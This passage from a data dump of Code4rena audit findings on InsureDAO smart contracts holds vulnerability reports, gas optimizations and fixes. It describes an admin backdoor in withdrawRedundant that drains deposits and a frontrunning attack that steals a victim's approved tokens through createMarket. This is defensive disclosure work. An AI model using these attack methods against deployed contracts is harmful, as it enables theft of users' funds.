inequality condition being `false`. It will transfer out all `vault.token()` amounts to the attacker.  ## Impact There's a backdoor in the `withdrawRedundant` that allows admins to steal all user deposits.  ## Recommended Mitigation Steps I think the devs wanted this logic from the code instead:  ```solidity function withdrawRedundant(address _token, address _to)      external      override      onlyOwner {      if (           _token == address(token)      ) {           if (balance < IERC20(token).balanceOf(address(this))) {                uint256 _redundant = IERC20(token).balanceOf(address(this)) -                     balance;                IERC20(token).safeTransfer(_to, _redundant);           }      } else if (IERC20(_token).balanceOf(address(this)) > 0) {           IERC20(_token).safeTransfer(                _to,                IERC20(_token).balanceOf(address(this))           );      } } ```   "}, {"title": "Initial pool deposit can be stolen", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/250", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  cmichel   # Vulnerability details  Note that the `PoolTemplate.initialize` function, called when creating a market with `Factory.createMarket`, calls a vault function to transfer an initial deposit amount (`conditions[1]`) _from_ the initial depositor (`_references[4]`):  ```solidity // PoolTemplate function initialize(      string calldata _metaData,      uint256[] calldata _conditions,      address[] calldata _references ) external override {      // ...       if (_conditions[1] > 0) {           // @audit vault calls asset.transferFrom(_references[4], vault, _conditions[1])           _depositFrom(_conditions[1], _references[4]);      } }  function _depositFrom(uint256 _amount, address _from)      internal      returns (uint256 _mintAmount) {      require(           marketStatus == MarketStatus.Trading && paused == false,           \"ERROR: DEPOSIT_DISABLED\"      );      require(_amount > 0, \"ERROR: DEPOSIT_ZERO\");       _mintAmount = worth(_amount);      // @audit vault calls asset.transferFrom(_from, vault, _amount)      vault.addValue(_amount, _from, address(this));       emit Deposit(_from, _amount, _mintAmount);       //mint iToken      _mint(_from, _mintAmount); } ```  The initial depositor needs to first approve the vault contract for the `transferFrom` to succeed.  An attacker can then frontrun the `Factory.createMarket` transaction with their own market creation (it does not have access restrictions) and create a market _with different parameters_ but still passing in `_conditions[1]=amount` and `_references[4]=victim`.  A market with parameters that the initial depositor did not want (different underlying, old whitelisted registry/parameter contract, etc.) can be created with their tokens and these tokens are essentially lost.  ## Recommended Mitigation Steps Can the initial depositor be set to `Factory.createMarket`'s `msg.sender`, instead of being able to pick a whitelisted one as `_references[4]`?   "}, {"title": "Premium payments can be timed", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/249", "labels": ["bug", "1 (Low Risk)", "disagree with severity", "sponsor acknowledged"], "target": "2022-01-insure-findings", "body": "Premium payments can be timed"}, {"title": "Lower slack can be higher than upper slack", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/248", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed", "sponsor disputed"], "target": "2022-01-insure-findings", "body": "# Handle  cmichel   # Vulnerability details  The `Parameters.setLowerSlack/setUpperSlack` functions do not check that the new value does still satisfy the `_lowerSlack <= _upperSlack` condition.  ## Recommended Mitigation Steps Check that `_lowerSlack <= _upperSlack`  is still satisfied in these functions.   "}, {"title": "Future owner is not cleared", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/247", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  cmichel   # Vulnerability details  The `Ownership.acceptTransferOwnership` function does not reset `_futureOwner` to zero.  ## Impact The future owner can repeatedly accept the governance, emitting an `AcceptNewOwnership` event each time, bloating listeners for this event with unnecessary data.  ## Recommended Mitigation Steps Reset `_futureOwner` to zero in `acceptTransferOwnership`.   "}, {"title": "Can create market without some conditions", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/246", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2022-01-insure-findings", "body": "Can create market without some conditions"}, {"title": "Typo for withdawable in multiple places in Parameters.sol  ", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/244", "labels": ["bug", "0 (Non-critical)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  hubble   # Vulnerability details  Feel free to lower the severity of the issue to Non-critical.  ## Impact Correctness of variable name  ## Proof of Concept File : Parameters.sol    line 39 :    mapping(address => uint256) private _withdawable;   line 153 :         _withdawable[_address] = _target;   line 349-352 :         if (_withdawable[_target] == 0) {             return _withdawable[address(0)];         } else {             return _withdawable[_target];  ## Tools Used Manual review  ## Recommended Mitigation Steps Change typo to _withdrawable   "}, {"title": "Input validation not done in few important functions in Parameters.sol", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/243", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  hubble   # Vulnerability details   ## Impact Input validation required for few important parameters as mentioned in the below functions.  ## Proof of Concept File : Parameters.sol    line 120 :     function setUpperSlack(address _address, uint256 _target)           Need to check that the _target value should be less than or equal to 100% (1000)     line 134 :     function setLowerSlack(address _address, uint256 _target)          Need to check that the _target value should be less than or equal to corresponding UpperSlack Value     line 177 :     function setFeeRate(address _address, uint256 _target)           Need to check that the _target value should be less than or equal to 1e6 (1000000)     line 191 :     function setMaxList(address _address, uint256 _target)           Need to check that the _target value should be greater than 1  ## Tools Used Manual review  ## Recommended Mitigation Steps Add require statements with proper value and comments for the respective input fields as given above   "}, {"title": "Inconsistency in pragma solidity version definition in InsureDAOERC20.sol", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/242", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  hubble   # Vulnerability details   ## Impact Inconsistency in pragma solidity versions in different solidity files.  ## Proof of Concept File : InsureDAOERC20.sol        pragma solidity ^0.8.0;  All other solidity files in the project        pragma solidity 0.8.7;  ## Tools Used Manual review  ## Recommended Mitigation Steps Set the version to 0.8.7 in the InsureDAOERC20.sol file  "}, {"title": "Constructor not used", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/240", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Jujic   # Vulnerability details  ## Impact The constructor is empty. You should remove constructor to save some gas.  ## Proof of Concept https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/InsureDAOERC20.sol#L21 ``` constructor() {} ```  ## Tools Used  ## Recommended Mitigation Steps Remove unused constructor   "}, {"title": "[WP-G19] Changing bool to uint256 can save gas", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/238", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-insure-findings", "body": "[WP-G19] Changing bool to uint256 can save gas"}, {"title": "[WP-G18] Avoiding repeated `marketStatus` checks can save gas", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/237", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  WatchPug   # Vulnerability details  Check `marketStatus` before for loops can save gas from unnecessary repeated checks.  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/PoolTemplate.sol#L342-L365  ```solidity function unlockBatch(uint256[] calldata _ids) external {     for (uint256 i = 0; i < _ids.length; i++) {         unlock(_ids[i]);     } }  function unlock(uint256 _id) public {     require(         insurances[_id].status == true &&             marketStatus == MarketStatus.Trading &&             insurances[_id].endTime + parameters.getGrace(msg.sender) <             block.timestamp,         \"ERROR: UNLOCK_BAD_COINDITIONS\"     );     insurances[_id].status == false;      lockedAmount = lockedAmount - insurances[_id].amount;      emit Unlocked(_id, insurances[_id].amount); } ```  ### Recomandation  Change to:  ```solidity function unlockBatch(uint256[] calldata _ids) external {     require(marketStatus == MarketStatus.Trading, \"ERROR: UNLOCK_BAD_COINDITIONS\")     for (uint256 i = 0; i < _ids.length; i++) {         _unlock(_ids[i]);     } }  function unlock(uint256 _id) external {     require(marketStatus == MarketStatus.Trading, \"ERROR: UNLOCK_BAD_COINDITIONS\");     _unlock(_id); }  function _unlock(uint256 _id) internal {     require(         insurances[_id].status == true &&             insurances[_id].endTime + parameters.getGrace(msg.sender) <             block.timestamp,         \"ERROR: UNLOCK_BAD_COINDITIONS\"     );     insurances[_id].status == false;      lockedAmount = lockedAmount - insurances[_id].amount;      emit Unlocked(_id, insurances[_id].amount); } ```   "}, {"title": "[WP-M17] `Vault.sol` Tokens with fee on transfer are not supported", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/236", "labels": ["bug", "2 (Med Risk)"], "target": "2022-01-insure-findings", "body": "[WP-M17] `Vault.sol` Tokens with fee on transfer are not supported"}, {"title": "[WP-G14] `AuctionBurnReserveSkew.sol#deposit()` Implementation can be simpler and save some gas", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/233", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/CDSTemplate.sol#L260-L270  ```solidity if (_available >= _amount) {     _compensated = _amount;     _attributionLoss = vault.transferValue(_amount, msg.sender);     emit Compensated(msg.sender, _amount); } else {     //when CDS cannot afford, pay as much as possible     _compensated = _available;     _attributionLoss = vault.transferValue(_available, msg.sender);     emit Compensated(msg.sender, _available); }  ```  ### Recommendation  Change to:  ```solidity _compensated = _available >= _amount? _amount: _available;  _attributionLoss = vault.transferValue(_compensated, msg.sender); emit Compensated(msg.sender, _compensated); ```  - Duplicated codes removed; - Shorter and simpler code.  "}, {"title": "[WP-G12] Cache function call results in the stack can save gas", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/231", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  WatchPug   # Vulnerability details  Cache and reusing the function call results, instead of calling it again, can save gas from unnecessary code execution.  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L163-L173  ```solidity if (available() < _amount) {      //when USDC in this contract isn't enough     uint256 _shortage = _amount - available();     _unutilize(_shortage);      assert(available() >= _amount); }  balance -= _amount; IERC20(token).safeTransfer(_to, _amount); ```  ### Recommendation  Change to:  ```solidity uint256 availableAmount = available() if ( availableAmount < _amount) {      //when USDC in this contract isn't enough     uint256 _shortage = _amount - available();     _unutilize(_shortage);      assert(availableAmount >= _amount); }  balance -= _amount; IERC20(token).safeTransfer(_to, _amount); ```  Other examples include:  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/CDSTemplate.sol#L295-L304  ```solidity function rate() external view returns (uint256) {     if (totalSupply() > 0) {         return             (vault.attributionValue(crowdPool) * MAGIC_SCALE_1E6) /             totalSupply();     } else {         return 0;     } } ```  `totalSupply()`  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L309-L312  ```solidity if (available() < _retVal) {     uint256 _shortage = _retVal - available();     _unutilize(_shortage); } ```  `available()`  "}, {"title": "[WP-G11] Check of `_amount > 0` can be done earlier to save gas", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/230", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  WatchPug   # Vulnerability details  When there are multiple checks, adjusting the sequence to allow the tx to fail earlier can save some gas.  Checks using less gas should be executed earlier than those with higher gas costs, to avoid unnecessary storage read, arithmetic operations, etc when it reverts.  For example:  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/CDSTemplate.sol#L238-L256  ```solidity require(paused == false, \"ERROR: PAUSED\"); require(     request.timestamp +         parameters.getLockup(msg.sender) <         block.timestamp,     \"ERROR: WITHDRAWAL_QUEUE\" ); require(     request.timestamp +         parameters.getLockup(msg.sender) +         parameters.getWithdrawable(msg.sender) >         block.timestamp,     \"ERROR: WITHDRAWAL_NO_ACTIVE_REQUEST\" ); require(     request.amount >= _amount,     \"ERROR: WITHDRAWAL_EXCEEDED_REQUEST\" ); require(_amount > 0, \"ERROR: WITHDRAWAL_ZERO\"); ```  The check of `_amount > 0` can be done earlier to avoid reading from storage when `_amount = 0`.  ## Recommendation  Change to:  ```solidity         require(paused == false, \"ERROR: PAUSED\");         require(_amount > 0, \"ERROR: WITHDRAWAL_ZERO\");         require(             request.amount >= _amount,             \"ERROR: WITHDRAWAL_EXCEEDED_REQUEST\"         );         require(             request.timestamp +                 parameters.getLockup(msg.sender) <                 block.timestamp,             \"ERROR: WITHDRAWAL_QUEUE\"         );         require(             request.timestamp +                 parameters.getLockup(msg.sender) +                 parameters.getWithdrawable(msg.sender) >                 block.timestamp,             \"ERROR: WITHDRAWAL_NO_ACTIVE_REQUEST\"         ); ```  Other examples include:  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/CDSTemplate.sol#L189-L191  ```solidity uint256 _balance = balanceOf(msg.sender); require(_balance >= _amount, \"ERROR: REQUEST_EXCEED_BALANCE\"); require(_amount > 0, \"ERROR: REQUEST_ZERO\"); ```  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/IndexTemplate.sol#L217-L236  ```solidity require(locked == false, \"ERROR: WITHDRAWAL_PENDING\"); require(     _requestTime + _lockup < block.timestamp,     \"ERROR: WITHDRAWAL_QUEUE\" ); require(     _requestTime + _lockup + parameters.getWithdrawable(msg.sender) >         block.timestamp,     \"ERROR: WITHDRAWAL_NO_ACTIVE_REQUEST\" ); require(     withdrawalReq[msg.sender].amount >= _amount,     \"ERROR: WITHDRAWAL_EXCEEDED_REQUEST\" ); require(_amount > 0, \"ERROR: WITHDRAWAL_ZERO\");  require(     _retVal <= withdrawable(),     \"ERROR: WITHDRAW_INSUFFICIENT_LIQUIDITY\" ); ```  "}, {"title": "Improper Upper Bound Definition on the Fee", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/229", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor acknowledged", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "Improper Upper Bound Definition on the Fee"}, {"title": "System Debt Is Not Handled When Insurance Pools Become Insolvent", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/228", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2022-01-insure-findings", "body": "System Debt Is Not Handled When Insurance Pools Become Insolvent"}, {"title": "Implement check effect interaction to align with best practices", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/227", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  defsec   # Vulnerability details  ## Impact  On the InsureDAOERC20, transferFrom function is vulnerable on the re-entrancy.  ## Proof of Concept  1. Navigate to the following contract. Approve function is written after transfer call. It is not possible to exploit on the current environment but that can be possible on the EVM.  ```     function transferFrom(         address sender,         address recipient,         uint256 amount     ) public virtual override returns (bool) {         _transfer(sender, recipient, amount);          uint256 currentAllowance = _allowances[sender][_msgSender()];         require(             currentAllowance >= amount,             \"ERC20: transfer amount exceeds allowance\"         );          _approve(sender, _msgSender(), currentAllowance - amount);          return true;     } ```   ## Tools Used  Code Review  ## Recommended Mitigation Steps   Follow check effect interaction pattern. Consider to use openzeppelin erc20 contract. The sample transferFrom function can be seen from below.   ```   function transferFrom(       address sender,       address recipient,       uint256 amount   ) public virtual override returns (bool) {       uint256 currentAllowance = _allowances[sender][_msgSender()];       if (currentAllowance != type(uint256).max) {           require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");           unchecked {               _approve(sender, _msgSender(), currentAllowance - amount);           }       }        _transfer(sender, recipient, amount);        return true;   } ```  https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol#L161  "}, {"title": "Allowance checks not correctly implemented", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/226", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "Allowance checks not correctly implemented"}, {"title": "Malicious Market Creators Can Steal Tokens From Unsuspecting Approved Reference Accounts", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/224", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  leastwood   # Vulnerability details  ## Impact  The current method of market creation involves calling `Factory.createMarket()` with a list of approved `_conditions` and `_references` accounts. If a registered template address has `templates[address(_template)].isOpen == true`, then any user is able to call `createMarket()` using this template. If the template points to `PoolTemplate.sol`, then a malicious market creator can abuse `PoolTemplate.initialize()` as it makes a vault deposit from an account that they control. The vulnerable internal function, `_depositFrom()`, makes a vault deposit from the `_references[4]` address (arbitrarily set to an approved reference address upon market creation).  Hence, if approved `_references` accounts have set an unlimited approval amount for `Vault.sol` before deploying their market, a malicious user can frontrun market creation and cause these tokens to be transferred to the incorrect market.  This issue can cause honest market creators to have their tokens transferred to an incorrectly configured market, leading to unrecoverable funds. If their approval to `Vault.sol` was set to the unlimited amount, malicious users will also be able to force honest market creators to transfer more tokens than they would normally want to allow. ## Proof of Concept  https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Factory.sol#L158-L231 ``` function createMarket(     IUniversalMarket _template,     string memory _metaData,     uint256[] memory _conditions,     address[] memory _references ) public override returns (address) {     //check eligibility     require(         templates[address(_template)].approval == true,         \"ERROR: UNAUTHORIZED_TEMPLATE\"     );     if (templates[address(_template)].isOpen == false) {         require(             ownership.owner() == msg.sender,             \"ERROR: UNAUTHORIZED_SENDER\"         );     }     if (_references.length > 0) {         for (uint256 i = 0; i < _references.length; i++) {             require(                 reflist[address(_template)][i][_references[i]] == true ||                     reflist[address(_template)][i][address(0)] == true,                 \"ERROR: UNAUTHORIZED_REFERENCE\"             );         }     }      if (_conditions.length > 0) {         for (uint256 i = 0; i < _conditions.length; i++) {             if (conditionlist[address(_template)][i] > 0) {                 _conditions[i] = conditionlist[address(_template)][i];             }         }     }      if (         IRegistry(registry).confirmExistence(             address(_template),             _references[0]         ) == false     ) {         IRegistry(registry).setExistence(             address(_template),             _references[0]         );     } else {         if (templates[address(_template)].allowDuplicate == false) {             revert(\"ERROR: DUPLICATE_MARKET\");         }     }      //create market     IUniversalMarket market = IUniversalMarket(         _createClone(address(_template))     );      IRegistry(registry).supportMarket(address(market));          markets.push(address(market));       //initialize     market.initialize(_metaData, _conditions, _references);      emit MarketCreated(         address(market),         address(_template),         _metaData,         _conditions,         _references     );      return address(market); } ```  https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L178-L221 ``` function initialize(     string calldata _metaData,     uint256[] calldata _conditions,     address[] calldata _references ) external override {     require(         initialized == false &&             bytes(_metaData).length > 0 &&             _references[0] != address(0) &&             _references[1] != address(0) &&             _references[2] != address(0) &&             _references[3] != address(0) &&             _references[4] != address(0) &&             _conditions[0] <= _conditions[1],         \"ERROR: INITIALIZATION_BAD_CONDITIONS\"     );     initialized = true;      string memory _name = string(         abi.encodePacked(             \"InsureDAO-\",             IERC20Metadata(_references[1]).name(),             \"-PoolInsurance\"         )     );     string memory _symbol = string(         abi.encodePacked(\"i-\", IERC20Metadata(_references[1]).symbol())     );     uint8 _decimals = IERC20Metadata(_references[0]).decimals();      initializeToken(_name, _symbol, _decimals);      registry = IRegistry(_references[2]);     parameters = IParameters(_references[3]);     vault = IVault(parameters.getVault(_references[1]));      metadata = _metaData;      marketStatus = MarketStatus.Trading;      if (_conditions[1] > 0) {         _depositFrom(_conditions[1], _references[4]);     } } ```  ## Tools Used  Manual code review. Discussions with kohshiba.  ## Recommended Mitigation Steps  After discussions with the sponsor, they have opted to parse a `_creator` address to `PoolTemplate.sol` which will act as the depositor and be set to `msg.sender` in `Factory.createMarket()`. This will prevent malicious market creators from forcing vault deposits from unsuspecting users who are approved in `Factory.sol` and have also approved `Vault.sol` to make transfers on their behalf.  "}, {"title": "[WP-G7] `InsureDAOERC20#transferFrom()` Check of allowance can be done earlier to save gas", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/219", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  WatchPug   # Vulnerability details  Check of allowance can be done earlier (before `_transfer()`) to save some gas for failure transactions.  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/InsureDAOERC20.sol#L152-L168  ```solidity function transferFrom(     address sender,     address recipient,     uint256 amount ) public virtual override returns (bool) {     _transfer(sender, recipient, amount);      uint256 currentAllowance = _allowances[sender][_msgSender()];     require(         currentAllowance >= amount,         \"ERC20: transfer amount exceeds allowance\"     );      _approve(sender, _msgSender(), currentAllowance - amount);      return true; } ```   See: -   https://github.com/OpenZeppelin/openzeppelin-contracts/blob/80d8da05644ceef3cd8e81860882571f037f8667/contracts/token/ERC20/ERC20.sol#L162-L169   "}, {"title": "[WP-G6] Remove redundant code can save gas", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/218", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  WatchPug   # Vulnerability details  Removing `return 0` can make the code simpler and save some gas.  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/CDSTemplate.sol#L295-L303  ```solidity     function rate() external view returns (uint256) {         if (totalSupply() > 0) {             return                 (vault.attributionValue(crowdPool) * MAGIC_SCALE_1E6) /                 totalSupply();         } else {             return 0;         }     } ```  ### Recommendation  Can be changed to:  ```solidity     function rate() external view returns (uint256) {         if (totalSupply() > 0) {             return                 (vault.attributionValue(crowdPool) * MAGIC_SCALE_1E6) /                 totalSupply();         }      } ```  Other examples include:  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/CDSTemplate.sol#L312-L317  ```solidity         if (_balance == 0) {             return 0;         } else {             return                 _balance * vault.attributionValue(crowdPool) / totalSupply();         } ```  Can be changed to:  ```solidity if (_balance > 0) {     return         _balance * vault.attributionValue(crowdPool) / totalSupply(); }  ```  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Factory.sol#L176-L176  ```solidity for (uint256 i = 0; i < _references.length; i++) ```  Can be changed to:  ```solidity for (uint256 i; i < _references.length; i++) ```  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/IndexTemplate.sol#L493-L497  ```solidity if (totalLiquidity() > 0) {     return (totalAllocatedCredit * MAGIC_SCALE_1E6) / totalLiquidity(); } else {     return 0; } ```  Can be changed to:  ```solidity if (totalLiquidity() > 0) {     return (totalAllocatedCredit * MAGIC_SCALE_1E6) / totalLiquidity(); }  ```  "}, {"title": "[WP-N5] Missing error messages in require statements", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/217", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/CDSTemplate.sol#L288-L288  ```solidity require(registry.isListed(msg.sender)); ```  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Factory.sol#L100-L100  ```solidity require(address(_template) != address(0)); ```  "}, {"title": "[WP-G4] Remove unnecessary variables can save gas", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/216", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/CDSTemplate.sol#L109-L113  ```solidity string memory _name = \"InsureDAO-CDS\"; string memory _symbol = \"iCDS\"; uint8 _decimals = IERC20Metadata(_references[0]).decimals();  initializeToken(_name, _symbol, _decimals); ```  The local variable `_name`, `_symbol`, `_decimals` is used only once. Making the expression inline can save gas.  ### Recommendation  Change to:  ```solidity initializeToken(\"InsureDAO-CDS\", \"iCDS\", IERC20Metadata(_references[0]).decimals()); ```  Other examples include:  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/CDSTemplate.sol#L189-L190  ```solidity uint256 _balance = balanceOf(msg.sender); require(_balance >= _amount, \"ERROR: REQUEST_EXCEED_BALANCE\"); ```  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/CDSTemplate.sol#L257-L257  ```solidity uint256 _surplusAttribution = surplusPool; ```  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/Callback.sol#L62-L63  ```solidity uint256 _assetReserve = asset.safeBalance(); require(_assetReserve >= assetReserve + assetIn, 'E304'); ```  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/Callback.sol#L51-L52  ```solidity uint256 _collateralReserve = collateral.safeBalance(); require(_collateralReserve >= collateralReserve + collateralIn, 'E305'); ```  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/IndexTemplate.sol#L456-L463  ```solidity uint256 _shortage; if (totalLiquidity() < _amount) {     //Insolvency case     _shortage = _amount - _value;     uint256 _cds = ICDSTemplate(registry.getCDS(address(this)))         .compensate(_shortage);     _compensated = _value + _cds; } ```  `_shortage` and `_cds`.  "}, {"title": "[WP-G3] `AuctionBurnReserveSkew.sol#deposit()` Implementation can be simpler and save some gas", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/215", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/CDSTemplate.sol#L140-L148  ```solidity if (_supply > 0 && _liquidity > 0) {     _mintAmount = (_amount * _supply) / _liquidity; } else if (_supply > 0 && _liquidity == 0) {     //when vault lose all underwritten asset =      _mintAmount = _amount * _supply; //dilute LP token value af. Start CDS again. } else {     //when _supply == 0,     _mintAmount = _amount; } ```  ### Recommendation  Change to:  ```solidity if (_supply == 0) {     _mintAmount = _amount; } else {     _mintAmount = _liquidity == 0 ? _amount * _supply : (_amount * _supply) / _liquidity; }  ```  - Removed 2 checks; - Removed 1 branch; - Simpler branch (costs less gas) goes first.  "}, {"title": "[WP-G1] `InsureDAOERC20#transferFrom()` Do not reduce approval on transferFrom if current allowance is type(uint256).max", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/213", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  WatchPug   # Vulnerability details  The Wrapped Ether (WETH) ERC-20 contract has a gas optimization that does not update the allowance if it is the max uint.  The latest version of OpenZeppelin's ERC20 token contract also adopted this optimization.  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/InsureDAOERC20.sol#L152-L168  ```solidity function transferFrom(     address sender,     address recipient,     uint256 amount ) public virtual override returns (bool) {     _transfer(sender, recipient, amount);      uint256 currentAllowance = _allowances[sender][_msgSender()];     require(         currentAllowance >= amount,         \"ERC20: transfer amount exceeds allowance\"     );      _approve(sender, _msgSender(), currentAllowance - amount);      return true; } ```  See: -   https://github.com/OpenZeppelin/openzeppelin-contracts/blob/80d8da05644ceef3cd8e81860882571f037f8667/contracts/token/ERC20/ERC20.sol#L162 -   https://github.com/OpenZeppelin/openzeppelin-contracts/pull/3085  ### Recommendation  Change to:  ```solidity function transferFrom(     address sender,     address recipient,     uint256 amount ) public virtual override returns (bool) {     _transfer(sender, recipient, amount);      uint256 currentAllowance = _allowances[sender][_msgSender()];     if (currentAllowance != type(uint256).max) {         require(             currentAllowance >= amount,             \"ERC20: transfer amount exceeds allowance\"         );          _approve(sender, _msgSender(), currentAllowance - amount);     }      return true; } ```  "}, {"title": "[WP-N0] Race condition on ERC20 approval", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/212", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2022-01-insure-findings", "body": "[WP-N0] Race condition on ERC20 approval"}, {"title": "Avoid unnecessary code execution can save gas", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/210", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "Avoid unnecessary code execution can save gas"}, {"title": "Factory. createMarket doesn't check if input array length is too big", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/198", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2022-01-insure-findings", "body": "Factory. createMarket doesn't check if input array length is too big"}, {"title": "Vault. withdrawValue will fail on subtraction if there are not enough _attributions", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/197", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": 